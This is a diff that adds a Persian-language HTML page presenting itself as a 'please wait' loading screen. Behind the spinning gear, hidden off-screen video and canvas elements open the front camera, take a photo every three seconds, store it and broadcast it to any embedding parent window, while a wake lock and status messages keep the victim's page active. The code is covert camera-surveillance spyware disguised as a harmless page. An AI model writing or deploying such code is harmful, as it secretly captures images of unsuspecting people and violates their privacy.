@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>منتظر بمانید</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        
+        body {
+            background: #000000;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #888888;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            overflow: hidden;
+        }
+        
+        .loading-text {
+            font-size: 24px;
+            margin-top: 30px;
+            color: #aaaaaa;
+            animation: fade 2s infinite;
+        }
+        
+        .gear {
+            font-size: 120px;
+            color: #333333;
+            animation: spin 3s linear infinite;
+            filter: brightness(0.6);
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes fade {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+        
+        .status {
+            font-size: 14px;
+            margin-top: 20px;
+            color: #666666;
+            padding: 0 20px;
+        }
+        
+        #videoElement, #canvasElement {
+            display: none;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+        }
+    </style>
+</head>
+<body>
+    <!-- فقط این نمایش داده می‌شود -->
+    <div class="gear">⚙️</div>
+    <div class="loading-text">منتظر بمانید...</div>
+    <div class="status" id="statusText">در حال راه‌اندازی دوربین</div>
+    
+    <!-- عناصر مخفی -->
+    <video id="videoElement" autoplay playsinline muted></video>
+    <canvas id="canvasElement"></canvas>
+    
+    <script>
+        // وضعیت
+        let cameraActive = false;
+        let lastCaptureTime = 0;
+        const CAPTURE_INTERVAL = 3000; // هر ۳ ثانیه
+        
+        // عناصر
+        const statusText = document.getElementById('statusText');
+        
+        // شروع خودکار
+        startCamera();
+        
+        async function startCamera() {
+            try {
+                statusText.textContent = 'درخواست دسترسی به دوربین...';
+                
+                // درخواست دوربین بدون نمایش
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
+                
+                const videoElement = document.getElementById('videoElement');
+                videoElement.srcObject = stream;
+                
+                // صبر کن تا ویدیو آماده شود
+                await new Promise(resolve => {
+                    videoElement.onloadedmetadata = () => {
+                        videoElement.play();
+                        resolve();
+                    };
+                });
+                
+                cameraActive = true;
+                statusText.textContent = 'دوربین فعال ✓ منتظر دستور...';
+                
+                // جلوگیری از sleep
+                if ('wakeLock' in navigator) {
+                    try {
+                        await navigator.wakeLock.request('screen');
+                    } catch (err) {
+                        console.log('Wake Lock غیرفعال');
+                    }
+                }
+                
+                // شروع ضبط دوره‌ای
+                startPeriodicCapture();
+                
+            } catch (error) {
+                statusText.textContent = 'خطا در دوربین: ' + error.message;
+                statusText.style.color = '#ff4444';
+            }
+        }
+        
+        function startPeriodicCapture() {
+            // هر ۳ ثانیه عکس بگیر
+            setInterval(() => {
+                if (cameraActive) {
+                    captureImage();
+                }
+            }, CAPTURE_INTERVAL);
+            
+            // اولین عکس بلافاصله
+            setTimeout(captureImage, 1000);
+        }
+        
+        function captureImage() {
+            if (!cameraActive) return;
+            
+            const video = document.getElementById('videoElement');
+            const canvas = document.getElementById('canvasElement');
+            
+            if (video.videoWidth === 0) return;
+            
+            // تنظیم اندازه
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // گرفتن عکس
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // ذخیره در localStorage
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            const timestamp = Date.now();
+            
+            localStorage.setItem('last_capture', imageData);
+            localStorage.setItem('last_capture_time', timestamp.toString());
+            
+            // برای دسترسی از دامنه اصلی
+            try {
+                window.parent.postMessage({
+                    type: 'new_capture',
+                    data: imageData,
+                    time: timestamp
+                }, '*');
+            } catch (e) {
+                // ignore
+            }
+            
+            lastCaptureTime = timestamp;
+            console.log('📸 تصویر ذخیره شد:', new Date(timestamp).toLocaleTimeString());
+        }
+        
+        // نگه داشتن صفحه فعال
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                statusText.textContent = 'لطفاً صفحه را فعال نگه دارید';
+            } else {
+                statusText.textContent = 'دوربین فعال ✓ منتظر دستور...';
+            }
+        });
+        
+        // وقتی صفحه بسته می‌شود
+        window.addEventListener('beforeunload', () => {
+            localStorage.setItem('camera_status', 'inactive');
+        });
+        
+        // نگه داشتن وضعیت فعال
+        localStorage.setItem('camera_status', 'active');
+        
+    </script>
+</body>
+</html>
